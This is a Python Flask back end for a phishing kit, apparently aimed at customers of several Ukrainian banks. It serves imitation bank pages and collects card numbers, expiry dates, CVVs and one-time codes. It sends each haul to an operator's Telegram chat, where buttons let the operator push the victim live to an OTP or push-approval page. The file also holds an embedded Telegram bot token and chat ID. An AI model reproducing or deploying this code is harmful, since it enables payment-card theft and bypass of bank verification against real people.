from flask import Flask, render_template, request, jsonify, url_for
import requests
import threading

app = Flask(__name__)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "7651061888:AAEDgDzqVjhKTO-u467eCFMCK5dIMLqLqAY"  # Замените на ваш токен
TELEGRAM_CHAT_ID = "8073657873"  # Замените на ваш Chat ID

# Глобальные переменные для состояния
redirect_event = threading.Event()
current_redirect_url = None


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/privatbank')
def privatbank_page():
    return render_template('privatbank.html')


@app.route('/monobank')
def monobank_page():
    return render_template('monobank.html')


@app.route('/oschadbank')
def oschadbank_page():
    return render_template('oschadbank.html')


@app.route('/raiffeisenbank')
def raiffeisenbank_page():
    return render_template('raiffeisenbank.html')


@app.route('/loading')
def loading_page():
    return render_template('loading.html')


@app.route('/enter_code')
def enter_code_page():
    return render_template('confirmation.html')


@app.route('/push_notification')
def push_notification_page():
    return render_template('push_notification.html')


@app.route('/refund_confirmation')
def refund_confirmation_page():
    return render_template('refund_confirmation.html')


@app.route('/submit_card', methods=['POST'])
def submit_card():
    global redirect_event, current_redirect_url
    card_holder = request.form.get('cardHolder')
    card_number = request.form.get('cardNumber').replace(" ", "")
    expiry_date = request.form.get('expiryDate')
    cvv = request.form.get('cvv')

    if not all([card_holder, card_number, expiry_date, cvv]):
        return jsonify({"success": False, "message": "Все поля должны быть заполнены!"})

    if len(card_number) != 16 or not card_number.isdigit():
        return jsonify({"success": False, "message": "Номер карты должен содержать 16 цифр!"})

    if len(expiry_date) != 5 or not expiry_date[:2].isdigit() or not expiry_date[3:].isdigit() or expiry_date[2] != '/':
        return jsonify({"success": False, "message": "Неверный формат срока действия (MM/YY)!"})

    if len(cvv) != 3 or not cvv.isdigit():
        return jsonify({"success": False, "message": "CVV должен содержать 3 цифры!"})

    message = (
        f"Новая транзакция:\n"
        f"Имя держателя карты: {card_holder}\n"
        f"Номер карты: {card_number}\n"
        f"Срок действия: {expiry_date}\n"
        f"CVV: {cvv}\n\n"
        "Выберите действие ниже:"
    )
    send_to_telegram_with_buttons(message)
    redirect_event.clear()  # Сброс события
    current_redirect_url = None  # Сброс редиректа
    return render_template('loading.html')


@app.route('/submit_otp', methods=['POST'])
def submit_otp():
    data = request.json
    otp = data.get('otp')

    if not otp:
        return jsonify({"success": False, "message": "Код підтвердження не може бути пустим!"})

    # Отправляем код в Telegram
    message = f"Код підтвердження: {otp}"
    response = send_to_telegram(message)

    if response:
        # Возвращаем успешный ответ с URL для редиректа
        return jsonify({"success": True, "redirect_url": url_for('refund_confirmation_page', _external=True)})
    else:
        return jsonify({"success": False, "message": "Помилка відправлення коду до Telegram."})


@app.route('/confirm_push', methods=['POST'])
def confirm_push():
    """Маршрут для подтверждения пуш-уведомления."""
    return jsonify({"success": True, "redirect_url": url_for('refund_confirmation_page', _external=True)})


@app.route('/check_redirect', methods=['GET'])
def check_redirect():
    global redirect_event, current_redirect_url
    if redirect_event.is_set() and current_redirect_url:
        redirect_event.clear()  # Сброс после отправки
        return jsonify({"redirect": True, "url": current_redirect_url})
    return jsonify({"redirect": False})


@app.route('/telegram_callback', methods=['POST'])
def telegram_callback():
    global redirect_event, current_redirect_url
    data = request.json

    if "callback_query" in data:
        callback_data = data["callback_query"]["data"]

        if callback_data == "code":
            current_redirect_url = url_for('enter_code_page', _external=True)
        elif callback_data == "push":
            current_redirect_url = url_for('push_notification_page', _external=True)

        redirect_event.set()

        chat_id = data["callback_query"]["message"]["chat"]["id"]
        message_id = data["callback_query"]["message"]["message_id"]
        action_message = "Выбранное действие принято."
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": action_message,
        }
        requests.post(url, json=payload)

    return jsonify({"ok": True})


def send_to_telegram_with_buttons(message):
    """Отправка сообщения с кнопками в Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
        "reply_markup": {
            "inline_keyboard": [
                [{"text": "Отправить код", "callback_data": "code"}],
                [{"text": "Отправить пуш", "callback_data": "push"}],
            ]
        },
    }
    response = requests.post(url, json=payload)
    if response.status_code != 200:
        print(f"Ошибка отправки в Telegram: {response.text}")


def send_to_telegram(message):
    """Отправка сообщения в Telegram."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": TELEGRAM_CHAT_ID,
        "text": message,
    }
    try:
        response = requests.post(url, json=payload)
        print(f"Ответ Telegram API: {response.status_code}, {response.text}")
        return response.status_code == 200
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")
        return False


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=5000)
